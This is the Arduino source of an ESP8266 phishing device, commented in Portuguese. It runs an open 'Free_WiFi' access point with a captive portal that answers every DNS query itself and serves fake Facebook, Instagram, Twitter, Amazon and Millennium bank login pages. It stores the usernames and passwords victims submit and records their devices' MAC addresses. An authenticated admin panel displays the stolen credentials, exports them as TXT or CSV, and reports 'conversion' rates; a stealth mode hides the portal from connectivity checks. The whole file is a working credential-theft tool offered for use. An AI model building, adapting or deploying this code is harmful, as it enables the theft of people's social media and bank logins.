#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <FS.h>
#include <LittleFS.h>

#define FSYS LittleFS

// ╔═══════════════════════════════════════════════════════════════╗
// ║  🔐 CONFIGURAÇÃO                                              ║
// ╚═══════════════════════════════════════════════════════════════╝
const char* ADMIN_USER = "rui";
const char* ADMIN_PASS = "rui";
const bool STEALTH_MODE = false;

const char* apSSID = "Free_WiFi";
const char* apPassword = "";
const byte DNS_PORT = 53;

DNSServer dnsServer;
ESP8266WebServer server(80);

const char* CREDS_FILE = "/creds.txt";
const char* LOGS_FILE = "/logs.txt";

unsigned long totalCaptures = 0, startTime = 0;

// Rate limiting
struct RateLimit { IPAddress ip; int attempts; unsigned long lastAttempt; };
RateLimit rateLimits[20];
int rlCount = 0;

// Dispositivos
struct Device { IPAddress ip; String mac, lastPage, username, password; unsigned long firstSeen, lastSeen; int credCount; };
Device devices[15];
int devCount = 0;

// Stats
struct Stats { int fb=0, ig=0, tw=0, ml=0, az=0, unk=0; } stats;

// ═══════════════════════════════════════════════════════════════
// FUNÇÕES AUXILIARES
// ═══════════════════════════════════════════════════════════════

void logA(String action, String ip, String detail="") {
  File f = FSYS.open(LOGS_FILE, "a");
  if (!f) return;
  f.print(String((millis()-startTime)/1000) + "s|" + action + "|" + ip + (detail.length()>0 ? "|"+detail : "") + "\n");
  f.close();
}

bool checkRL(IPAddress ip) {
  unsigned long now = millis();
  for (int i=0; i<rlCount; i++) {
    if (rateLimits[i].ip == ip) {
      if (rateLimits[i].attempts >= 5 && now - rateLimits[i].lastAttempt < 900000) {
        logA("BLOCKED", ip.toString());
        return false;
      }
      if (now - rateLimits[i].lastAttempt > 300000) rateLimits[i].attempts = 0;
      rateLimits[i].attempts++;
      rateLimits[i].lastAttempt = now;
      return true;
    }
  }
  if (rlCount < 20) { rateLimits[rlCount] = {ip, 1, now}; rlCount++; }
  return true;
}

bool auth() {
  IPAddress cip = server.client().remoteIP();
  if (!checkRL(cip)) {
    server.send(429, "text/html", "<html><body style='font-family:Arial;text-align:center;padding:50px;background:#0f172a;color:#e5e7eb;'><h1 style='color:#ef4444;'>⛔ Bloqueado</h1><p>Demasiadas tentativas falhadas.<br>Aguarda 15 minutos.</p></body></html>");
    return false;
  }
  if (!server.authenticate(ADMIN_USER, ADMIN_PASS)) {
    logA("FAIL_AUTH", cip.toString());
    server.requestAuthentication(BASIC_AUTH, "Admin Panel", "Insere as credenciais");
    return false;
  }
  for (int i=0; i<rlCount; i++) if (rateLimits[i].ip == cip) { rateLimits[i].attempts = 0; break; }
  logA("AUTH_OK", cip.toString());
  return true;
}

void saveCred(String u, String p, String ip, String pg) {
  File f = FSYS.open(CREDS_FILE, "a");
  if (f) { f.print(String((millis()-startTime)/1000) + "s|" + pg + "|" + ip + "|" + u + "|" + p + "\n"); f.close(); }
  totalCaptures++;
  if (pg=="Facebook") stats.fb++; else if (pg=="Instagram") stats.ig++; else if (pg=="Twitter") stats.tw++;
  else if (pg=="Millennium") stats.ml++; else if (pg=="Amazon") stats.az++; else stats.unk++;
  logA("CAPTURE", ip, pg + " - " + u);
}

void updateDev(IPAddress ip, String pg, String u, String p) {
  String mac = "N/A";
  struct station_info *si = wifi_softap_get_station_info();
  while (si) {
    if (IPAddress(si->ip.addr) == ip) {
      char m[18]; snprintf(m, 18, "%02X:%02X:%02X:%02X:%02X:%02X", si->bssid[0], si->bssid[1], si->bssid[2], si->bssid[3], si->bssid[4], si->bssid[5]);
      mac = String(m); break;
    }
    si = STAILQ_NEXT(si, next);
  }
  wifi_softap_free_station_info();
  
  for (int i=0; i<devCount; i++) {
    if (devices[i].ip == ip) {
      devices[i].lastPage = pg; devices[i].lastSeen = millis();
      devices[i].username = u; devices[i].password = p; devices[i].credCount++;
      if (mac != "N/A") devices[i].mac = mac;
      return;
    }
  }
  if (devCount < 15) {
    devices[devCount] = {ip, mac, pg, u, p, millis(), millis(), 1};
    devCount++;
  }
}

String readF(const char* path) {
  if (!FSYS.exists(path)) return "Vazio.";
  File f = FSYS.open(path, "r");
  if (!f) return "Erro.";
  String c = ""; while (f.available()) c += f.readString(); f.close();
  return c.length() == 0 ? "Vazio." : c;
}

int countCreds() {
  if (!FSYS.exists(CREDS_FILE)) return 0;
  File f = FSYS.open(CREDS_FILE, "r"); if (!f) return 0;
  int c = 0; while (f.available()) { if (f.readStringUntil('\n').length() > 0) c++; } f.close();
  return c;
}

void servePage(String fn, String pn) {
  File f = FSYS.open(fn, "r");
  if (!f) { server.send(404, "text/plain", "Not found"); return; }
  String h = f.readString(); f.close();
  int fp = h.indexOf("</form>");
  if (fp != -1) h = h.substring(0, fp) + "<input type='hidden' name='page' value='" + pn + "'/>" + h.substring(fp);
  server.send(200, "text/html", h);
}

String fmtTime(unsigned long s) {
  int hr = s/3600, mn = (s%3600)/60, sc = s%60;
  if (hr > 0) return String(hr) + "h" + String(mn) + "m";
  if (mn > 0) return String(mn) + "m" + String(sc) + "s";
  return String(sc) + "s";
}

// ═══════════════════════════════════════════════════════════════
// HANDLERS PÚBLICOS (SEM AUTENTICAÇÃO)
// ═══════════════════════════════════════════════════════════════

void hRoot() { 
  File f = FSYS.open("/index.html", "r"); 
  if (!f) { server.send(404, "text/plain", "index.html not found"); return; } 
  server.send(200, "text/html", f.readString()); 
  f.close(); 
}

void hFB() { servePage("/facebook.html", "Facebook"); }
void hIG() { servePage("/instagram.html", "Instagram"); }
void hTW() { servePage("/twitter.html", "Twitter"); }
void hML() { servePage("/millennium.html", "Millennium"); }
void hAZ() { servePage("/amazon.html", "Amazon"); }

void hLogin() {
  String u = server.arg("username"), p = server.arg("password"), pg = server.arg("page");
  IPAddress cip = server.client().remoteIP();
  if (pg == "" || pg == "null") {
    String ref = server.header("Referer");
    if (ref.indexOf("/facebook")!=-1) pg="Facebook"; else if (ref.indexOf("/instagram")!=-1) pg="Instagram";
    else if (ref.indexOf("/twitter")!=-1) pg="Twitter"; else if (ref.indexOf("/millennium")!=-1) pg="Millennium";
    else if (ref.indexOf("/amazon")!=-1) pg="Amazon"; else pg="unknown";
  }
  saveCred(u, p, cip.toString(), pg);
  updateDev(cip, pg, u, p);
  server.send(200, "text/html", "<!DOCTYPE html><html><head><meta charset='utf-8'><meta http-equiv='refresh' content='3;url=/'/><style>body{background:#111827;color:#e5e7eb;font-family:system-ui;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;}.msg{background:#020617;border-radius:12px;padding:32px;text-align:center;border:1px solid #1f2937;}.spinner{border:3px solid #374151;border-top:3px solid #3b82f6;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto;}@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style></head><body><div class='msg'><h2 style='color:#facc15'>✅ Autenticacao concluida</h2><div class='spinner'></div><p>A conectar...</p></div></body></html>");
}

void hCP() { if (STEALTH_MODE) { server.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='0;url=https://www.google.com'/></head></html>"); } else { hRoot(); } }
void h204() { if (STEALTH_MODE) { server.sendHeader("Location", "https://www.google.com", true); } else { server.sendHeader("Location", "http://192.168.4.1/", true); } server.send(302, "text/plain", ""); }
void hNF() { hRoot(); }

// ═══════════════════════════════════════════════════════════════
// HANDLERS ADMIN (COM AUTENTICAÇÃO)
// ═══════════════════════════════════════════════════════════════

void hAdmin() {
  if (!auth()) return;
  unsigned long up = (millis()-startTime)/1000;
  int cc = countCreds(), cd = WiFi.softAPgetStationNum();
  float cvr = cd > 0 ? (float)cc/cd*100 : 0;
  String best = "N/A"; int mx = 0;
  if (stats.fb > mx) { mx = stats.fb; best = "Facebook"; }
  if (stats.ig > mx) { mx = stats.ig; best = "Instagram"; }
  if (stats.tw > mx) { mx = stats.tw; best = "Twitter"; }
  if (stats.ml > mx) { mx = stats.ml; best = "Millennium"; }
  if (stats.az > mx) { mx = stats.az; best = "Amazon"; }
  
  String pg = "<!DOCTYPE html><html><head><meta charset='utf-8'><title>Admin</title><meta name='viewport' content='width=device-width,initial-scale=1'><meta http-equiv='refresh' content='15'/><style>body{font-family:system-ui;background:#0f172a;color:#e2e8f0;padding:20px;margin:0;}.c{max-width:1000px;margin:auto;}h1{color:#facc15;border-bottom:2px solid #334155;padding-bottom:10px;}.card{background:#1e293b;border-radius:8px;padding:20px;margin:15px 0;border:1px solid #334155;}.st{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #334155;}.st:last-child{border:none;}.lb{color:#94a3b8;}.vl{color:#fff;font-weight:600;}.btn{display:inline-block;padding:10px 20px;margin:5px;background:#3b82f6;color:#fff;text-decoration:none;border-radius:6px;}.btn:hover{background:#2563eb;}.btn-s{background:#10b981;}.btn-d{background:#ef4444;}.btn-w{background:#f59e0b;}.acts{text-align:center;flex-wrap:wrap;display:flex;justify-content:center;}.sg{display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));gap:10px;margin-top:15px;}.sc{background:#334155;padding:12px;border-radius:6px;text-align:center;}.sv{font-size:1.8em;font-weight:bold;color:#facc15;}.sl{font-size:0.8em;color:#94a3b8;}.sec{background:#065f46;border:1px solid #10b981;padding:12px;border-radius:8px;margin-bottom:15px;font-size:0.9em;}</style></head><body><div class='c'><h1>🛡️ Admin Panel</h1>";
  pg += "<div class='sec'>🔒 <b>Sessao Autenticada</b> | User: <b>" + String(ADMIN_USER) + "</b> | Stealth: " + String(STEALTH_MODE ? "ON" : "OFF") + " | Auto-refresh: 15s</div>";
  pg += "<div class='card'><h3 style='margin-top:0;color:#60a5fa'>📊 Estatisticas</h3>";
  pg += "<div class='st'><span class='lb'>SSID:</span><span class='vl'>" + String(apSSID) + "</span></div>";
  pg += "<div class='st'><span class='lb'>IP:</span><span class='vl'>" + WiFi.softAPIP().toString() + "</span></div>";
  pg += "<div class='st'><span class='lb'>Uptime:</span><span class='vl'>" + fmtTime(up) + "</span></div>";
  pg += "<div class='st'><span class='lb'>Dispositivos:</span><span class='vl'><a href='/admin/devices' style='color:#3b82f6'>" + String(cd) + " 👁️</a></span></div>";
  pg += "<div class='st'><span class='lb'>Credenciais:</span><span class='vl'>" + String(cc) + "</span></div>";
  pg += "<div class='st'><span class='lb'>Conversao:</span><span class='vl'>" + String(cvr, 1) + "%</span></div>";
  pg += "<div class='st'><span class='lb'>Melhor pagina:</span><span class='vl'>" + best + " (" + String(mx) + ")</span></div></div>";
  pg += "<div class='card'><h3 style='margin-top:0;color:#60a5fa'>📈 Por Pagina</h3><div class='sg'>";
  pg += "<div class='sc'><div class='sv'>" + String(stats.fb) + "</div><div class='sl'>📘 FB</div></div>";
  pg += "<div class='sc'><div class='sv'>" + String(stats.ig) + "</div><div class='sl'>📸 IG</div></div>";
  pg += "<div class='sc'><div class='sv'>" + String(stats.tw) + "</div><div class='sl'>𝕏 TW</div></div>";
  pg += "<div class='sc'><div class='sv'>" + String(stats.ml) + "</div><div class='sl'>🏦 ML</div></div>";
  pg += "<div class='sc'><div class='sv'>" + String(stats.az) + "</div><div class='sl'>📦 AZ</div></div></div></div>";
  pg += "<div class='card'><h3 style='margin-top:0;color:#60a5fa'>⚙️ Acoes</h3><div class='acts'>";
  pg += "<a href='/admin/credentials' class='btn btn-s'>📋 Credenciais</a>";
  pg += "<a href='/admin/devices' class='btn'>📱 Dispositivos</a>";
  pg += "<a href='/admin/download' class='btn'>💾 TXT</a>";
  pg += "<a href='/admin/csv' class='btn'>📊 CSV</a>";
  pg += "<a href='/admin/logs' class='btn btn-w'>📜 Logs</a>";
  pg += "<a href='/admin/clear' class='btn btn-d' onclick='return confirm(\"Limpar tudo?\")'>🗑️ Limpar</a></div></div></div></body></html>";
  server.send(200, "text/html", pg);
}

void hCreds() {
  if (!auth()) return;
  String cr = readF(CREDS_FILE);
  String pg = "<!DOCTYPE html><html><head><meta charset='utf-8'><title>Credenciais</title><style>body{font-family:monospace;background:#0f172a;color:#e2e8f0;padding:20px;}pre{background:#1e293b;padding:20px;border-radius:8px;border:1px solid #334155;font-size:13px;line-height:1.8;overflow-x:auto;}.btn{display:inline-block;padding:10px 20px;margin:10px 5px;background:#3b82f6;color:#fff;text-decoration:none;border-radius:6px;}</style></head><body><h1 style='color:#facc15'>📋 Credenciais</h1><p style='color:#94a3b8'>Formato: tempo|pagina|IP|user|pass</p><pre>" + cr + "</pre><a href='/admin' class='btn'>← Voltar</a><a href='/admin/download' class='btn'>💾 TXT</a><a href='/admin/csv' class='btn'>📊 CSV</a></body></html>";
  server.send(200, "text/html", pg);
}

void hDevices() {
  if (!auth()) return;
  struct station_info *si = wifi_softap_get_station_info();
  int tc = WiFi.softAPgetStationNum();
  String pg = "<!DOCTYPE html><html><head><meta charset='utf-8'><title>Dispositivos</title><meta http-equiv='refresh' content='5'/><style>body{font-family:system-ui;background:#0f172a;color:#e2e8f0;padding:20px;}table{width:100%;border-collapse:collapse;}th,td{padding:8px;text-align:left;border-bottom:1px solid #334155;font-size:0.85em;}th{color:#60a5fa;}.ip{color:#facc15;font-family:monospace;}.mac{color:#10b981;font-family:monospace;font-size:0.8em;}.on{color:#10b981;}.off{color:#94a3b8;}.btn{display:inline-block;padding:10px 20px;margin:10px 5px;background:#3b82f6;color:#fff;text-decoration:none;border-radius:6px;}.sum{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:20px;}.si{background:#1e293b;padding:15px;border-radius:8px;text-align:center;}.sv{font-size:1.8em;font-weight:bold;color:#facc15;}.sl{color:#94a3b8;font-size:0.8em;}</style></head><body><h1 style='color:#facc15'>📱 Dispositivos</h1>";
  pg += "<div class='sum'><div class='si'><div class='sv'>" + String(tc) + "</div><div class='sl'>Online</div></div><div class='si'><div class='sv'>" + String(devCount) + "</div><div class='sl'>Com Creds</div></div><div class='si'><div class='sv'>" + String(totalCaptures) + "</div><div class='sl'>Capturas</div></div></div>";
  pg += "<table><tr><th>St</th><th>IP</th><th>MAC</th><th>Online</th><th>User</th><th>Pass</th><th>Pg</th><th>#</th></tr>";
  
  for (int i=0; i<devCount; i++) {
    bool on = false;
    struct station_info *t = si;
    while (t) { if (IPAddress(t->ip.addr) == devices[i].ip) { on = true; break; } t = STAILQ_NEXT(t, next); }
    String us = devices[i].username.length() > 12 ? devices[i].username.substring(0, 12) + ".." : devices[i].username;
    String ps = devices[i].password.length() > 8 ? devices[i].password.substring(0, 8) + ".." : devices[i].password;
    pg += "<tr><td class='" + String(on ? "on" : "off") + "'>" + String(on ? "🟢" : "🔴") + "</td><td class='ip'>" + devices[i].ip.toString() + "</td><td class='mac'>" + devices[i].mac + "</td><td>" + fmtTime((millis()-devices[i].firstSeen)/1000) + "</td><td>" + us + "</td><td>" + ps + "</td><td>" + devices[i].lastPage + "</td><td><b>" + String(devices[i].credCount) + "</b></td></tr>";
  }
  
  struct station_info *c = si;
  while (c) {
    IPAddress sip(c->ip.addr);
    bool found = false;
    for (int i=0; i<devCount; i++) if (devices[i].ip == sip) { found = true; break; }
    if (!found) {
      char m[18]; snprintf(m, 18, "%02X:%02X:%02X:%02X:%02X:%02X", c->bssid[0], c->bssid[1], c->bssid[2], c->bssid[3], c->bssid[4], c->bssid[5]);
      pg += "<tr style='opacity:0.5'><td class='on'>🟢</td><td class='ip'>" + sip.toString() + "</td><td class='mac'>" + String(m) + "</td><td>-</td><td><i>Sem atividade</i></td><td>-</td><td>-</td><td>0</td></tr>";
    }
    c = STAILQ_NEXT(c, next);
  }
  wifi_softap_free_station_info();
  
  pg += "</table><p style='text-align:center;color:#94a3b8;font-size:0.8em'>🔄 Auto-refresh: 5s</p><a href='/admin' class='btn'>← Voltar</a></body></html>";
  server.send(200, "text/html", pg);
}

void hLogs() {
  if (!auth()) return;
  String lg = readF(LOGS_FILE);
  String pg = "<!DOCTYPE html><html><head><meta charset='utf-8'><title>Logs</title><meta http-equiv='refresh' content='10'/><style>body{font-family:monospace;background:#0f172a;color:#e2e8f0;padding:20px;}pre{background:#1e293b;padding:20px;border-radius:8px;border:1px solid #334155;font-size:12px;line-height:1.6;max-height:400px;overflow-y:auto;}.btn{display:inline-block;padding:10px 20px;margin:10px 5px;background:#3b82f6;color:#fff;text-decoration:none;border-radius:6px;}.btn-d{background:#ef4444;}.leg{background:#1e293b;padding:12px;border-radius:8px;margin-bottom:15px;}.leg span{margin-right:15px;}</style></head><body><h1 style='color:#facc15'>📜 Logs</h1><div class='leg'><span style='color:#10b981'>● AUTH_OK</span><span style='color:#ef4444'>● FAIL_AUTH</span><span style='color:#facc15'>● CAPTURE</span><span style='color:#f59e0b'>● BLOCKED</span></div><pre>" + lg + "</pre><a href='/admin' class='btn'>← Voltar</a><a href='/admin/clearlogs' class='btn btn-d' onclick='return confirm(\"Limpar logs?\")'>🗑️ Limpar Logs</a></body></html>";
  server.send(200, "text/html", pg);
}

void hDL() {
  if (!auth()) return;
  if (!FSYS.exists(CREDS_FILE)) { server.send(404, "text/plain", "Vazio"); return; }
  File f = FSYS.open(CREDS_FILE, "r");
  server.sendHeader("Content-Disposition", "attachment; filename=credentials.txt");
  server.streamFile(f, "text/plain"); f.close();
  logA("DL_TXT", server.client().remoteIP().toString());
}

void hCSV() {
  if (!auth()) return;
  if (!FSYS.exists(CREDS_FILE)) { server.send(404, "text/plain", "Vazio"); return; }
  File f = FSYS.open(CREDS_FILE, "r");
  String csv = "Tempo,Pagina,IP,Username,Password\n";
  while (f.available()) {
    String ln = f.readStringUntil('\n');
    if (ln.length() > 0) { ln.replace("|", ","); ln.replace("s,", ","); csv += ln + "\n"; }
  }
  f.close();
  server.sendHeader("Content-Disposition", "attachment; filename=credentials.csv");
  server.send(200, "text/csv", csv);
  logA("DL_CSV", server.client().remoteIP().toString());
}

void hClr() {
  if (!auth()) return;
  if (FSYS.exists(CREDS_FILE)) FSYS.remove(CREDS_FILE);
  totalCaptures = 0; devCount = 0; stats = Stats();
  logA("CLEAR", server.client().remoteIP().toString());
  server.send(200, "text/html", "<!DOCTYPE html><html><head><meta http-equiv='refresh' content='2;url=/admin'/><style>body{background:#0f172a;color:#e5e7eb;font-family:system-ui;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}</style></head><body><div style='text-align:center'><h2 style='color:#10b981'>✅ Dados eliminados</h2></div></body></html>");
}

void hClrLogs() {
  if (!auth()) return;
  if (FSYS.exists(LOGS_FILE)) FSYS.remove(LOGS_FILE);
  server.send(200, "text/html", "<!DOCTYPE html><html><head><meta http-equiv='refresh' content='2;url=/admin/logs'/><style>body{background:#0f172a;color:#e5e7eb;font-family:system-ui;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}</style></head><body><div style='text-align:center'><h2 style='color:#10b981'>✅ Logs eliminados</h2></div></body></html>");
}

// ═══════════════════════════════════════════════════════════════
// SETUP & LOOP
// ═══════════════════════════════════════════════════════════════

void setup() {
  startTime = millis();
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(apSSID, apPassword);
  if (!FSYS.begin()) { FSYS.format(); FSYS.begin(); }
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  
  // Páginas públicas (sem auth)
  server.on("/", HTTP_GET, hRoot);
  server.on("/facebook", HTTP_GET, hFB);
  server.on("/instagram", HTTP_GET, hIG);
  server.on("/twitter", HTTP_GET, hTW);
  server.on("/millennium", HTTP_GET, hML);
  server.on("/amazon", HTTP_GET, hAZ);
  server.on("/login", HTTP_POST, hLogin);
  
  // Admin (com auth) - tudo dentro de /admin/
  server.on("/admin", HTTP_GET, hAdmin);
  server.on("/admin/devices", HTTP_GET, hDevices);
  server.on("/admin/credentials", HTTP_GET, hCreds);
  server.on("/admin/logs", HTTP_GET, hLogs);
  server.on("/admin/download", HTTP_GET, hDL);
  server.on("/admin/csv", HTTP_GET, hCSV);
  server.on("/admin/clear", HTTP_GET, hClr);
  server.on("/admin/clearlogs", HTTP_GET, hClrLogs);
  
  // Captive portal
  server.on("/generate_204", HTTP_GET, h204);
  server.on("/gen_204", HTTP_GET, h204);
  server.on("/hotspot-detect.html", HTTP_GET, hCP);
  server.on("/library/test/success.html", HTTP_GET, hCP);
  server.on("/connecttest.txt", HTTP_GET, hCP);
  server.on("/redirect", HTTP_GET, hCP);
  server.on("/favicon.ico", HTTP_GET, []() { server.send(204); });
  server.onNotFound(hNF);
  
  server.begin();
  logA("START", WiFi.softAPIP().toString());
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}